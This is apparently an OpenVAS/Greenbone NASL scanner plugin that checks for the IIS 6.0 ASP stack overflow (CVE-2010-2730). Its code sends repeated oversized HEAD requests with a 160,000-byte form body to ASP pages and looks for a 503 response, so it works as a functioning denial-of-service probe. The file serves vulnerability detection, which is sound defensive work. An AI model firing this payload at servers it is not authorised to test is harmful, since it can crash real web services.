CPE = "cpe:/a:microsoft:internet_information_services";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801520" );
	script_version( "2020-11-25T11:26:55+0000" );
	script_tag( name: "last_modification", value: "2020-11-25 11:26:55 +0000 (Wed, 25 Nov 2020)" );
	script_tag( name: "creation_date", value: "2010-10-08 08:29:14 +0200 (Fri, 08 Oct 2010)" );
	script_bugtraq_id( 43138 );
	script_cve_id( "CVE-2010-2730" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_name( "Microsoft IIS ASP Stack Based Buffer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "secpod_ms_iis_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "IIS/installed" );
	script_xref( name: "URL", value: "http://bug.zerobox.org/show-2780-1.html" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15167/" );
	script_xref( name: "URL", value: "http://www.deltadefensesystems.com/blog/?p=217" );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-065" );
	script_tag( name: "impact", value: "Successful exploitation will let the remote unauthenticated attackers to force
  the IIS server to become unresponsive until the IIS service is restarted manually by the administrator." );
	script_tag( name: "affected", value: "Microsoft Internet Information Services version 6.0." );
	script_tag( name: "insight", value: "The flaw is due to a stack overflow error in the in the IIS worker
  process which can be exploited using a crafted POST request to hosted 'ASP' pages." );
	script_tag( name: "solution", value: "The vendor has released updates. Please see the references for more information." );
	script_tag( name: "summary", value: "The host is running Microsoft IIS Webserver and is prone to
  stack based buffer overflow vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for file in make_list( "/login.asp",
	 "/index.asp",
	 "/default.asp" ) {
	for(i = 0;i < 10;i++){
		string = crap( data: "C=A&", length: 160000 );
		req = NASLString( "HEAD ", file, " HTTP/1.1 \\r\\n", "Host: ", host, "\\r\\n", "Connection:Close \\r\\n", "Content-Type: application/x-www-form-urlencoded \\r\\n", "Content-Length:", strlen( string ), "\\r\\n\\r\\n", string );
		res = http_send_recv( port: port, data: req );
		if(ereg( pattern: "^HTTP/1\\.[01] 503", string: res ) && ( ContainsString( res, "Service Unavailable" ) )){
			report = http_report_vuln_url( port: port, url: file );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

